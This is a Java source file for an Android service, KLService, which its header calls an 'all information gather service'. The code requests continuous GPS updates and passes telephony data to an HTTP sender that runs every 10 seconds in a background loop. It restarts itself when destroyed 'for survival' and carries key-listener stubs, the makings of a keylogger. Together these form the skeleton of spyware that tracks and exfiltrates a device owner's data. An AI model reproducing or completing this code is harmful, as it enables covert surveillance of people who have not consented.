/********************************************************************************
 * KLService
 * ---------
 * A general purpose all information gather service. 
 * Class: KLSActivity.
 * Class Description: Starter application for KLService main functionality. 
 * Author: Aviad Golan -=OverFlow=-
 * 			(aviadgolan@gmail.com)
 *   .--.                  .---. .-.                       
 *  : ,. :                 : .--': :                 nTM    
 *  : :: :.-..-. .--. .--. : `;  : :   .--. .-..-..-.      
 *  : :; :: `; :' '_.': ..': :   : :_ ' .; :: `; `; :      
 *  `.__.'`.__.'`.__.':_;  :_;   `.__;`.__.'`.__.__.'      
 *
 ********************************************************************************/

package com.OverFlow.KLService;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.method.KeyListener;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Toast;

public class KLService extends Service implements KeyListener {
	//MEMBERS:
	private int mDebugLevel;
	private Thread mHttpThread;
	private int mIntervalTime;
	private LocationManager lm;
	private LocationListener ll;
	public static Context mContext;
   	public static boolean rRun;
   	public static Location mLocation;
	
	//FUNCTIONS:
    @Override
    public IBinder onBind(Intent arg0) {
          return null;
    }
    
    @Override
    public void onCreate() {
    	mDebugLevel = KLSDebugLog.getDebugLevel();
		super.onCreate();
		if (mDebugLevel  > 0) {
			Toast.makeText(this, "Service created ...", Toast.LENGTH_LONG).show();
		}
		if (mDebugLevel > 1) {
			Log.i(getClass().getSimpleName(), "AVIAD: Service created ...");
		}
		
		//Init Required Members:
		mContext = this;
		mIntervalTime = 10000;
		mHttpThread = new Thread(httpRunnable);
		lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
		ll = new KLSLocationListener();
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, ll);
	
		//serviceStatus = true;
		//We go to our logic stuff....
		KLSlogic();
    }
    
    @Override
    public void onDestroy() {
		super.onDestroy();
		if (mDebugLevel  > 1) {
			Toast.makeText(this, "AVIAD: Service created ...", Toast.LENGTH_LONG).show();
		}
		if (mDebugLevel > 0) {
			Log.i(getClass().getSimpleName(), "AVIAD: Service destroyed ...");
		}
		
		rRun = false;
		
		//We restart service for survival
		startService(new Intent(KLService.this, KLService.class));
    }

	@Override
	public void clearMetaKeyState(View view, Editable content, int states) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public int getInputType() {
		// TODO Auto-generated method stub
		return 0;
	}

	@Override
	public boolean onKeyDown(View view, Editable text, int keyCode,
			KeyEvent event) {
		Toast.makeText(this, "...KeyPressDown...", Toast.LENGTH_LONG).show();
		return false;
	}

	@Override
	public boolean onKeyOther(View view, Editable text, KeyEvent event) {
		Toast.makeText(this, "...KeyPressOther...", Toast.LENGTH_LONG).show();
		return false;
	}

	@Override
	public boolean onKeyUp(View view, Editable text, int keyCode, KeyEvent event) {
		Toast.makeText(this, "...KeyPressUP...", Toast.LENGTH_LONG).show();
		return false;
	}
	
	public void KLSlogic() {
    	//Logication ba-rosh...
        //SystemClock.sleep(1000);
		mHttpThread.start();
	}
	
	final Handler handler = new Handler();
	
	//HTTP sender Thread:
    final Runnable httpRunnable = new Runnable() {
    	@Override
        public void run() {
		    //Thread Run:
    		Looper.prepare();
        	KLSHttpSender sender = new KLSHttpSender((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
        	//Prepare for a loop(Note to self: Andy requested this..)
        	
    		if (mDebugLevel  > 1) {
    			Toast.makeText(mContext, "Http Thread Starting ...", Toast.LENGTH_LONG).show();
    		}
    		if (mDebugLevel > 0) {
    			Log.i(getClass().getSimpleName(), "AVIAD: Http Thread Starting ...");
    		}
        	
        	//Since thread.stop() was deprecated we use the old flag approach:
        	rRun = true;
        	while (rRun) {
        		if (mDebugLevel  > 1) {
        			Toast.makeText(mContext, "Http Thread Running ...", Toast.LENGTH_LONG).show();
        		}
        		if (mDebugLevel > 0) {
        			Log.i(getClass().getSimpleName(), "AVIAD: Http Thread Running ...");
        		}
        		
        		//Start Thread Main Code:
        		
        		sender.sendData();
        		
        		//END Thread Main Code.
        		
        		//Rest for a while
	        	SystemClock.sleep(mIntervalTime);
        	}
        	
        	//Thread Stopped Code:
    		if (mDebugLevel  > 1) {
    			Toast.makeText(mContext, "Http Thread Stopping ...", Toast.LENGTH_LONG).show();
    		}
    		if (mDebugLevel > 0) {
    			Log.i(getClass().getSimpleName(), "AVIAD: Http Thread Stopped ...");
    		}
		}
     };
}

